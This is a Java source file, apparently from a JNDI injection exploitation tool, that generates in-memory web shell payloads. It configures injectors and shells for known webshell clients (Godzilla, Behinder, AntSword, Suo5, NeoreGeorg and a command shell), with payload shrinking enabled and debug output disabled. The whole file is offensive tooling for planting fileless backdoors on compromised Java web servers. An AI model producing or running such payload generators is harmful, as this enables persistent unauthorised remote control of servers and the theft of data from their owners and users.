package map.jndi.payload;

import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.Server;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.config.*;

public class MemShellPayload {
    public static GenerateResult generate(String server, String tool, String type) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.valueOf(server))
                .shellTool(ShellTool.valueOf(tool))
                .shellType(type)
                .shrink(true)
                .debug(false)
                .build();
        InjectorConfig injectorConfig = InjectorConfig.builder().build();
        ShellToolConfig shellToolConfig = getShellToolConfig(shellConfig.getShellTool());

        return MemShellGenerator.generate(shellConfig, injectorConfig, shellToolConfig);
    }
    public static void printInfo(GenerateResult result) {
        System.out.println();
        System.out.println("Injector ClassName: " + result.getInjectorClassName());
        System.out.println("Shell ClassName: " + result.getShellClassName());
        System.out.println(result.getShellConfig());
        System.out.println(result.getShellToolConfig());
        System.out.println();
    }

    public static ShellToolConfig getShellToolConfig(ShellTool shellTool) {
        switch (shellTool) {
            case Godzilla:
                return GodzillaConfig.builder().build();
            case Behinder:
                return BehinderConfig.builder().build();
            case AntSword:
                return AntSwordConfig.builder().build();
            case Command:
                return CommandConfig.builder().build();
            case Suo5:
                return Suo5Config.builder().build();
            case NeoreGeorg:
                return NeoreGeorgConfig.builder().build();
            default:
                throw new UnsupportedOperationException("Unknown Shell Tool");
        }
    }
}
